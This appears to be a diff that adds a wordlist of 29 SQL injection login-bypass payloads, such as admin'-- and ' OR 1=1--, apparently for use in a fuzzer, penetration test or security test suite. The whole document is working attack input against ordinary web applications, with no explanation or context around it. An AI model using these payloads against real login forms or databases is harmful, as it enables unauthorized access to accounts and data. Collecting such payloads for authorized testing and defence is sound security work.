@@ -1,0 +1,29 @@
+admin'--
+admin' #
+admin'/*
+admin' OR '1'='1
+admin' OR 1=1--
+admin') OR ('1'='1
+admin') OR 1=1--
+admin" OR "1"="1
+admin" OR 1=1--
+admin' OR '1'='1'--
+' OR 1=1 LIMIT 1--
+') OR ('1'='1
+') OR 1=1--
+' OR '1'='1
+' OR 1=1--
+' OR 'a'='a
+') OR ('1'='1
+') OR 1=1--
+" OR ""="
+" OR 1=1--
+' OR 1=1 LIMIT 1--
+' OR 'x'='x
+' OR 1=1#
+' OR 1=1/*
+1' OR '1'='1
+1') OR ('1'='1
+1' OR 1=1--
+'='
+' OR '1'='1' --
